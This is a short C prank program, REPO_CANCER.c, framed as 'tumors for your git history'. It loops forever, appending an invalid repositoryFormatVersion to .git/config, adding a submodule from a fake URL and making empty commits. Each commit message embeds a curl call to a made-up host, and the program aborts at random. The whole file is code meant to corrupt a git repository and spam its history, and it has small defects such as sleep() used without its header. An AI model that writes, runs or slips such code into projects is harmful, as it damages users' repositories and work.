// REPO_CANCER.c - Terminal tumors for your git history

#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define MAYHEM() (rand() % 666 == 0 ? abort() : (void)0)

void inject_chaos() {
  FILE *f = fopen(".git/config", "a+");
  fprintf(f, "[core]\n  repositoryFormatVersion = 0xFACADE\n");
  fclose(f);
  
  // Quantum entangle submodules
  system("git submodule add https://github.com/void/null.git cellar");
}

void commit_granuloma() {
  char cmd[256];
  snprintf(cmd, sizeof(cmd), 
    "git commit --allow-empty -m '$(curl -s http://metaphor.sudo/login?panic=%d)'",
    time(NULL)
  );
  system(cmd);
  MAYHEM();
}

int main() {
  srand(time(NULL));
  while(1) {
    inject_chaos();
    commit_granuloma();
    sleep(rand() % 13);
  }
}